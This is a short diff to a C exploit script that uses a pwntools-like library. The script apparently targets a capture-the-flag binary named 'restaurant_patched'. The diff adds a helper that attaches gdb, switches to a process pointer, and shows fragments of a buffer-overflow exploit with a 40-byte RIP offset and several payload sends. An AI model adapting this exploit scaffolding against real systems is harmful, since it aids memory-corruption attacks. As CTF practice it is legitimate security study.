@@ -2,10 +2,19 @@
 #include <pawlib.h>
 #include <stdio.h>
 #include <stdlib.h>
+
+void setup( process *p )
+{
+    char *cmds[] = { "b main" };
+    paw_attach( p, cmds, "tmux split-window -h 'gdb -p {pid} -x {script}'" );
+}
+
 int main()
 {
-    process p   = paw_open_process( "./restaurant_patched" );
-    p.log_level = 0;
+    process *p   = paw_open_process( "./restaurant_patched" );
+    p->log_level = 1;
+
+    setup( p );
 
     int rip_offset = 40;
 
@@ -25,7 +34,7 @@ int main()
 
     paw_add( &payload, "1" );
 
-    paw_recvuntil( p, ">", 1 );
+    paw_recvuntil( p, ">" );
     paw_sendline( p, payload );
 
     data payload2 = paw_init_data();
@@ -66,5 +75,5 @@ int main()
     paw_sendline( p, payload4 );
     paw_recv( p, 200 );
 
-    paw_close( &p );
+    paw_close( p );
 }
